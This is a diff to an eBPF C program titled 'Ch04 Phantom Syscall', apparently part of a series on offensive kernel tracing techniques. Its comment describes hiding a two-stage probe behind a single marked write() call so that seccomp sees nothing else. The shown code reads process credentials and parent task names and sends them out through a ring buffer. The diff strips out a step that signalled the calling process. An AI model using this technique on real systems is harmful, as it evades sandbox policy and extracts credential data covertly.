@@ -1,11 +1,6 @@
 // Ch04 Phantom Syscall — write() with magic marker is the ONLY syscall
 // userspace issues; tracepoint + tail-call into stage 2 reads kernel-side
 // creds/task info and exfils via ringbuf. Seccomp sees only write().
-//
-// REAL EFFECT: in addition to exfiltration, stage 2 sends SIGUSR1 back
-// to the calling process via bpf_send_signal, proving BIDIRECTIONAL
-// control — the BPF can both extract data FROM and inject signals INTO
-// the target, all triggered by a single write() syscall.
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -13,14 +8,11 @@
 
 char LICENSE[] SEC("license") = "GPL";
 
-#define SIGUSR1 10
-
 struct evt {
     unsigned int pid, tgid, uid, euid;
     char comm[16];
     char parent_comm[16];
     char payload[32];
-    int signal_sent;    // 1 if SIGUSR1 was sent back to caller
 };
 
 struct {
@@ -86,13 +78,6 @@ int phantom_stage2(struct trace_event_raw_sys_enter *ctx)
     struct task_struct *p = BPF_CORE_READ(t, real_parent);
     bpf_probe_read_kernel_str(&s->parent_comm, sizeof(s->parent_comm),
                                BPF_CORE_READ(p, comm));
-
-    // REAL EFFECT: send SIGUSR1 back to the calling process to prove
-    // bidirectional control through a single write() syscall.
-    s->signal_sent = 0;
-    int sig_err = bpf_send_signal(SIGUSR1);
-    if (sig_err == 0)
-        s->signal_sent = 1;
 
     struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
     if (!e) return 0;
